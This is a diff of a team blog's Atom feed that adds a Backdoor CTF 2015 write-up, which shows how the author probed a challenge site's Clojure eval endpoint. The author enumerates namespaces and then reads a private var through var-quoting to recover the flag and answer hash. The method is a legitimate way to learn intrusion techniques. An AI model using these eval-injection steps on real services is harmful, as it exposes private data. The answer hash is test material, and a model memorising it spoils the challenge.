@@ -4,7 +4,7 @@
   <title><![CDATA[GeeksSpeak Team Blog]]></title>
   <link href="http://geeksspeak.github.io/atom.xml" rel="self"/>
   <link href="http://geeksspeak.github.io/"/>
-  <updated>2015-04-03T00:37:50+04:30</updated>
+  <updated>2015-04-03T00:46:53+04:30</updated>
   <id>http://geeksspeak.github.io/</id>
   <author>
     <name><![CDATA[GeeksSpeak]]></name>
@@ -12,5 +12,112 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Backdoor CTF 2015 - Noname Writeup]]></title>
+    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-noname-writeup/"/>
+    <updated>2015-04-03T00:42:36+04:30</updated>
+    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-noname-writeup</id>
+    <content type="html"><![CDATA[<p><strong>Backdoor2015 NONAME Writeup</strong>
+<strong>Point = 200</strong>
+<strong>Category = Exploit</strong>
+<strong>Description : </strong></p>
+
+<blockquote><p>Intrestingly enough, even though it was not expected, Chintu found a cool website to play with, though he can&rsquo;t get the flag. Can you? Visit <a href="https://agile-garden-1672.herokuapp.com/">this</a>. Submit the SHA-256 hash of the flag obtained.</p>
+
+<p>Welcome to Noname! You can see an intrepreter above
+Get admin&rsquo;s flag and admin&rsquo;s secret. Remember admin is one of the people
+Submit sha-256 of secret and flag joined
+Get admin&rsquo;s flag and admin&rsquo;s secret. Remember admin is one of the people
+Submit sha-256 of secret and flag joined</p></blockquote>
+
+<p>We could see  see an intrepreter like this :
+<img src="http://up.ashiyane.org/images/7f689wqyxbbwiaxbwl.png" alt="enter image description here" />
+so first for testing script give &ldquo;1&rdquo; as input it will retrun &ldquo;1&rdquo; again ..
+lets check whats going on in browser run firebug and check :</p>
+
+<p><img src="http://up.ashiyane.org/images/2fmqsv03ko2qatsw10tq.png" alt="enter image description here" /></p>
+
+<p>Its using JSON with eval.json at this <a href="https://agile-garden-1672.herokuapp.com/eval.json?expr=1">LINK</a> .
+Lets see whats happen if we execute our codes directly :
+<a href="https://agile-garden-1672.herokuapp.com/eval.json?expr=*">https://agile-garden-1672.herokuapp.com/eval.json?expr=*</a>
+And the response :</p>
+
+<pre><code>{"expr":"*","result":"#&lt;core$_STAR_ clojure.core$_STAR_@5ca69ca5&gt;"}
+</code></pre>
+
+<p> cool , Its Clojure and * is built-in function in &ldquo;clojure.core&rdquo;
+ lets google clojure.core and find all functions of this library :
+<a href="http://clojure.github.io/clojure/clojure.core-api.html">http://clojure.github.io/clojure/clojure.core-api.html</a>
+this link has all built-in functions of this library . after little searching found (loaded-libs) function .
+more googling about clojure i understood that for using function out syntax shoud be like
+(function) . for loaded-libs it should be (loaded-libs) and response :</p>
+
+<pre><code>{"expr":"(loaded-libs)","result":"#{bultitude.core cheshire.core cheshire.factory cheshire.generate cheshire.parse clj-time.core clj-time.format clj-yaml.core clojail.core clojail.jvm clojail.testers clojure.core.cache clojure.core.incubator clojure.core.memoize clojure.data.priority-map clojure.java.io clojure.main clojure.repl clojure.set clojure.stacktrace clojure.string clojure.template clojure.test clojure.tools.macro clojure.tools.reader clojure.tools.reader.default-data-readers clojure.tools.reader.edn clojure.tools.reader.impl.ExceptionInfo clojure.tools.reader.impl.commons clojure.tools.reader.impl.utils clojure.tools.reader.reader-types clojure.walk clout.core compojure.core compojure.handler compojure.response compojure.route flatland.useful.fn flatland.useful.seq flatland.useful.utils hiccup.compiler hiccup.core hiccup.def hiccup.element hiccup.middleware hiccup.page hiccup.util noir.cookies noir.request noir.response noir.session noir.util.crypt noir.util.middleware noir.validation noname.models.eval noname.people.admin noname.server noname.views.eval noname.views.home ring.adapter.jetty ring.middleware.content-type ring.middleware.cookies ring.middleware.file-info ring.middleware.flash ring.middleware.format ring.middleware.format-params ring.middleware.format-response ring.middleware.head ring.middleware.keyword-params ring.middleware.multipart-params ring.middleware.multipart-params.temp-file ring.middleware.nested-params ring.middleware.params ring.middleware.session ring.middleware.session.memory ring.middleware.session.store ring.util.codec ring.util.io ring.util.mime-type ring.util.response ring.util.servlet ring.util.time serializable.fn}"}
+</code></pre>
+
+<p>Found good things :</p>
+
+<pre><code>noname.models.eval noname.people.admin noname.server noname.views.eval noname.views.home
+</code></pre>
+
+<p>specialy &ldquo;noname.people.admin&rdquo; because of hint of question:</p>
+
+<blockquote><p>Remember admin is one of the people</p></blockquote>
+
+<p>Its loaded , so we can use it in our codes but we dont know functions and classes
+little googling found &ldquo;clojure.repl/dir&rdquo; it can list classes , functions &hellip; :
+<a href="https://agile-garden-1672.herokuapp.com/eval.json?expr=%28clojure.repl/dir%20noname.people.admin%29">https://agile-garden-1672.herokuapp.com/eval.json?expr=(clojure.repl/dir noname.people.admin)</a></p>
+
+<p>and response :</p>
+
+<pre><code>{"expr":"(clojure.repl/dir noname.people.admin)","result":"flag\nnil"}
+</code></pre>
+
+<p>oh . &ldquo;flag&rdquo; &hellip;. lets check if its public :
+<a href="https://agile-garden-1672.herokuapp.com/eval.json?expr=%28print%20noname.people.admin/flag%29">https://agile-garden-1672.herokuapp.com/eval.json?expr=%28print%20noname.people.admin/flag%29</a></p>
+
+<p> yes , its public , we can use it in interpreter :
+<img src="http://up.ashiyane.org/images/b95z537owt2a0cmrm1ca.png" alt="enter image description here" /></p>
+
+<p> got second part of flag :</p>
+
+<pre><code>Give me some code:
+</code></pre>
+
+<blockquote><p>(noname.people.admin/flag)
+Ma flag is : _b7w_1_l1k3_60l4n6_700nil</p></blockquote>
+
+<p>We need first part of flag called admin&rsquo;s secret , let test  (noname.people.admin/secret)
+and response id error :</p>
+
+<pre><code>{"error":true,"message":"java.lang.IllegalStateException: var: noname.people.admin/secret is not public"}
+</code></pre>
+
+<p>it private , and because of namespace we cant use it also we cant switch our namespace becuase &ldquo;ns&rdquo; is closed by Java.Security&hellip;</p>
+
+<p>lets google and find a way for bypass :)
+found this <a href="http://christophermaier.name/blog/2011/04/30/not-so-private-clojure-functions">http://christophermaier.name/blog/2011/04/30/not-so-private-clojure-functions</a></p>
+
+<p>awesome :D</p>
+
+<p>do what it said :
+<img src="http://up.ashiyane.org/images/lqo0cppgkh89dci505u1.png" alt="enter image description here" /></p>
+
+<p>and its the first part of the flag :</p>
+
+<blockquote><p>(#&lsquo;noname.people.admin/secret)
+&ldquo;Ma secret is: 1_4m_50_cl0jur3d_y0u_c4n7_3v3n_7h1nk&rdquo;</p>
+
+<p>Flag Format = sha256(secret+flag)
+sha256(1_4m_50_cl0jur3d_y0u_c4n7_3v3n_7h1nk_b7w_1_l1k3_60l4n6_700)
+<strong>147fadb708195779c6414a0ce9171bc4b966e03a9818383eabafa0e71a240d5a</strong></p></blockquote>
+
+<p>200 points ;)</p>
+
+<p>Thanks to : Re Mi , Shabgard , Ehsan , Hamidx9 , Fr0nk
+WriteUp By PARSA</p>
+]]></content>
+  </entry>
   
 </feed>
